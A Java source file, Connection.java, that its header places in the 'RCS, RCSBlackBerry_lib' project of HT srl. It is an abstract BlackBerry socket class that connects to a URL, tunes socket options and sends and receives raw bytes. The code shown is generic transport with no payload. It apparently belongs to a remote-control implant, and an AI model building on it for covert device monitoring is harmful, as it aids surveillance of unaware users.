//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Connection.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry.transfer;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.EOFException;
import java.io.IOException;

import javax.microedition.io.Connector;
import javax.microedition.io.SocketConnection;
import javax.microedition.io.StreamConnection;

import net.rim.device.api.io.SocketConnectionEnhanced;

import blackberry.Conf;
import blackberry.action.Apn;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;
import blackberry.utils.Utils;

// TODO: Auto-generated Javadoc
/**
 * The Class Connection.
 */
public abstract class Connection {
	private static final int CONNECT_TIMEOUT_SECS = 10;

	private static final int READ_TIMEOUT = 10000;

	//#ifdef DEBUG
	protected static Debug debug = new Debug("Connection",
			DebugLevel.INFORMATION);
	//#endif

	protected DataInputStream in;
	protected DataOutputStream out;
	protected StreamConnection connection;

	protected boolean connected;

	protected String url;

	//public abstract boolean connect();

	public final synchronized boolean connect() {
		boolean withoutoptions = true;
		boolean connected = false;

		// se la Conf lo prevede, si prova a settare le socket con le opzioni		
		if (Conf.SET_SOCKET_OPTIONS) {
			try {
				//#ifdef DEBUG_TRACE
				debug.trace("try connect with socket optimization");
				//#endif
				connected = connect(true);
				withoutoptions = false;
			} catch (IOException e) {
				//#ifdef DEBUG_ERROR
				debug.error(e);
				//#endif	
				
				Conf.SET_SOCKET_OPTIONS = false;
			}
		}

		if (withoutoptions) {
			try {
				//#ifdef DEBUG_TRACE
				debug.trace("try connect without");
				//#endif
				connected = connect(false);
			} catch (IOException e) {
				//#ifdef DEBUG_ERROR
				debug.error("Unrecoverable error: " + e);
				//#endif				
			}
		}
		return connected;
	}

	/**
	 * Connect.
	 * 
	 * @return true, if successful
	 * @throws IOException
	 */
	private final synchronized boolean connect(boolean setSocket)
			throws IOException {

		//#ifdef DBC
		Check.ensures(url != null, "url null");
		//#endif

		//#ifdef DEBUG_TRACE
		debug.trace("url: " + url);
		//#endif
		connection = (StreamConnection) Connector.open(url);

		if (connection == null) {
			//#ifdef DEBUG_WARN
			debug.warn("Null connection");
			//#endif
			return false;
		}
		
		if (connection instanceof SocketConnection && setSocket) {
			SocketConnection so = (SocketConnection) connection;

			StringBuffer sb = new StringBuffer();
			sb.append("LINGER: " + so.getSocketOption(SocketConnection.LINGER)
					+ "\n");
			sb.append("KEEPALIVE: "
					+ so.getSocketOption(SocketConnection.KEEPALIVE) + "\n");
			sb.append("DELAY: " + so.getSocketOption(SocketConnection.DELAY)
					+ "\n");
			sb.append("RCVBUF: " + so.getSocketOption(SocketConnection.RCVBUF)
					+ "\n");
			sb.append("SNDBUF: " + so.getSocketOption(SocketConnection.SNDBUF)
					+ "\n");

			//#ifdef DEBUG_TRACE
			debug.trace("connect options: " + sb.toString());
			//#endif

			((SocketConnection) connection).setSocketOption(
					SocketConnection.LINGER, 100);
			((SocketConnection) connection).setSocketOption(
					SocketConnection.KEEPALIVE, 1);
			((SocketConnection) connection).setSocketOption(
					SocketConnection.DELAY, 1);
			((SocketConnection) connection).setSocketOption(
					SocketConnection.RCVBUF, 1024 * 64);
			((SocketConnection) connection).setSocketOption(
					SocketConnection.SNDBUF, 1024 * 64);

		}

		if (connection instanceof SocketConnectionEnhanced && setSocket) {
			//#ifdef DEBUG_TRACE
			debug.trace("connect: instanceof enhanced");
			//#endif
			((SocketConnectionEnhanced) connection).setSocketOptionEx(
					SocketConnectionEnhanced.READ_TIMEOUT, READ_TIMEOUT);

		} else {
			//#ifdef DEBUG_TRACE
			debug.trace("connect: not enhanced");
			//#endif
		}

		in = connection.openDataInputStream();
		out = connection.openDataOutputStream();

		if (in != null && out != null) {
			connected = true;
			//#ifdef DBC
			Check.ensures(connection != null, "connection_ null");
			Check.ensures(in != null, "in_ null");
			Check.ensures(out != null, "out_ null");
			//#endif
		}

		//#ifdef DEBUG_TRACE
		debug.trace("connected: " + connected);

		//#endif
		return connected;
	}

	/**
	 * Disconnect.
	 */
	public final synchronized void disconnect() {
		if (connected) {
			connected = false;
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					//#ifdef DEBUG
					debug.error(e.toString());
					//#endif
				}
			}

			if (out != null) {
				try {
					out.close();
				} catch (final IOException e) {
					//#ifdef DEBUG
					debug.error(e.toString());
					//#endif
				}
			}

			if (connection != null) {
				try {
					connection.close();
				} catch (final IOException e) {
					//#ifdef DEBUG
					debug.error(e.toString());
					//#endif
				}
			}
		}

		in = null;
		out = null;
		connection = null;
	}

	/**
	 * Error.
	 * 
	 * @param string
	 *            the string
	 */
	protected abstract void error(String string);

	/**
	 * Checks if is active.
	 * 
	 * @return true, if is active
	 */
	public abstract boolean isActive();

	/**
	 * Receive.
	 * 
	 * @param length
	 *            the length
	 * @return the byte[]
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	public final synchronized byte[] receive(final int length)
			throws IOException {
		if (connected) {
			//#ifdef DBC
			Check.requires(in != null, "null in_");
			//#endif                       

			//#ifdef CONNECT_WAIT_AVAILABLE
			int available = 0;
			int steps = CONNECT_TIMEOUT_SECS;
			while (steps > 0) {
				debug.trace("steps: " + steps);
				available = in.available();
				if (available == 0) {
					debug.trace("nothing available");
					Utils.sleep(1000);
					steps--;
				} else {
					debug.trace("something available");
					steps = 0;
				}
			}
			debug.trace("receive in.available(): " + available);

			if (available == 0) {
				throw new IOException("Timeout, no available");
			}

			//#endif

			// Create an input array just big enough to hold the data
			// (we're expecting the same string back that we send).
			final byte[] buffer = new byte[length];

			try {
			    Thread.yield();
				in.readFully(buffer);
			} catch (EOFException ex) {
				throw new IOException("read fully");
			}
			//for(int i = 0; i < length; i++){
			//    buffer[i] = in.readByte();                
			//}

			return buffer;
		} else {
			error("Not connected. Active: " + isActive());
			return null;
		}
	}

	/**
	 * Pass some data to the server and wait for a response.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	public final synchronized boolean send(final byte[] data)
			throws IOException {

		if (connected) {
			//#ifdef DBC
			Check.requires(out != null, "null out_");
			//#endif

			final int length = data.length;
			Thread.yield();
			out.write(data, 0, length);

			//#ifdef DEBUG_TRACE
			debug.trace("sent :" + length);

			//#endif
			return true;
		} else {
			error("Not connected. Active: " + isActive());
			return false;
		}
	}

	/**
	 * Trace.
	 * 
	 * @param string
	 *            the string
	 */
	protected abstract void trace(String string);

	public void setApn(Apn apn) {
		// TODO Auto-generated method stub

	}

}
